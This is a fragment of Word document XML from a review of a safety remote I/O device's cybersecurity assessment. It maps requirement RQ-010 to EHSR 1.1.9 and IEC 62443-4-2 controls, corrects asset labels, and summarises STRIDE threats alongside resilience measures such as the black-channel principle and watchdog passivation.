          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corrected mapping:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-010 → EHSR 1.1.9 §3 →</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{CR 7.1(+RE1), CR 7.2, CR 3.5, CR 3.7, CR 3.6 [outcome anchor]}</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Firmware integrity/authenticity → RQ-005; connecting-device spoofing → RQ-001; update authorization/DCP → RQ-011 — all cross-referenced in the outcome matrix.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId241" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId242" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="740BFC25" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357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031"/>
        <w:gridCol w:w="6430"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="35E9A9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D5176C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F04701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Your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E0B0C1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Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="5E080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D794C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Asset A – Trusted Safety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33C09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326E6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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>ultimate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protected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asset</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="34F40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DE98A" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:del w:id="30" w:author="Unknown">
              <w:r w:rsidRPr="00AC6357">
                <w:delText>Asset B (PROFINET)</w:delText>
              </w:r>
            </w:del>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Asset 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54698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Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
              </w:rPr>
              <w:t>⚠</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Label fix (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>kept</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC635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231FA" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Your "Asset B = PROFINET" contradicts your master table (Asset B = config integrity). </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Re-labelled </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>to</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> Asset H (network </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>path</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="72FB8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11393" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>Asset H – 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8A746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5FD19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t>Correct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primary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attack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surface</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="621CB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9BB98" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">Asset E – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>Safety</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> 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E90F5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BDF91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 xml:space="preserve">Correct — self-tests/watchdog/diagnostics </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>detect</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the attack and force passivation.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="120F6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28655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Asset F – Domain Separation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80C5F" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC635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F79C5" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Keep — the single most important asset for RQ-010.</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> The black channel is </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>why</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> a COM/PROFINET flood cannot corrupt the safety function — only starve it into passivation. </w:t>
            </w:r>
            <w:hyperlink r:id="rId243" w:history="1">
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AC6357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73453302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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE — widened for "reasonably foreseeable," with reach-ins as cross-references:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C2C7DE" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Denial of Service (primary — receives RQ-001/RQ-007 deferrals).</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">Flooding </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>the</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> PROFINET/COM/IoT </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>interfaces</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B7A581C" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="da-DK"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="da-DK"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="da-DK"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="da-DK"/>
        </w:rPr>
        <w:t>Tampering</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="da-DK"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="da-DK"/>
        </w:rPr>
        <w:t>malformed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="da-DK"/>
        </w:rPr>
        <w:t xml:space="preserve">-frame </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="da-DK"/>
        </w:rPr>
        <w:t>fuzzing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="da-DK"/>
        </w:rPr>
        <w:t xml:space="preserve"> — CR 3.5/3.7).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F92D015" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>➕</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Spoofing (cross-reference RQ-001).</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Rogue-master/forged-frame vectors </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>aggregate</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> here but are </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tested</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in RQ-001 (TC-RQ001-02). </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">RQ-010 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>consumes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>the</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>outcome</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E45B262" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>➕</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Elevation of Privilege (cross-reference RQ-005/RQ-011).</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The unsigned-firmware path (tested in RQ-005 TC-RQ005-03; authorized-gate in RQ-011) is the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>one class that can lead to hazard</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — RQ-010 consumes its outcome as the decisive exception, without re-testing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D94414" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.3 Security Functions &amp; Gaps — Cross-Referenced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64156B16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>Resilience picture (retained — architecture correctly credited):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470"/>
        <w:gridCol w:w="4503"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="37C569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BA1133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3292B8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Documentation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33515E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Effect</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="472D3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2F1BA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 xml:space="preserve">External HW watchdog + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>F_WD_Time</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → passivation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0400A" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:lastRenderedPageBreak/>
              <w:t>SRIO-12868, SRIO-1857/1210, SRIO-853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5A6CF" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>Loss/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>staleness</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>defined</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> safe </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>state</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId244" w:history="1">
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId245" w:history="1">
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="1A894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7E24A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lastRenderedPageBreak/>
              <w:t>Black-channel principle</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (COM = QM non-safety; safety on SCPU)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0F0F3" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">SRIO-12921, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>SysArch</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> §3.3.1/4.1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8595D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>Core resilience: COM/PROFINET compromise cannot corrupt safety — only starve it</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId246" w:history="1">
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E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AC6357" w:rsidRPr="00AC6357" w14:paraId="146E2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23377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Dual SCPU cross-check + STL self-tests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D17CD" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>SRIO-12921, SRIO-10766, SRIO-1417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6D675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t>Detect</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> internal/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>random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corruption</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>FatalError</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> safe </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>state</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId247" w:history="1">
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
